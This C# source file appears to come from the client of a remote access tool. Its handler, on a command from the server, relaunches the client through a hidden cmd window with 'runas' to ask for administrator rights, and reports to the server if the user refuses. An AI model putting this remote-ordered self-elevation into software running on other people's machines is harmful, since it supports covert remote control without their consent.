using Client.Models;
using Client.Packets.ServerPackets;
using System.Diagnostics;

namespace Client.Controllers
{
    public static class CommandController
    {
        public static void doAskElevate(DoAskElevate packet, ClientMosaic client)
        {
            if(AuthenticationController.getAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.currentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };           

                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
                    //MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }

                Program.client.Exit();
            }
        }
    }
}
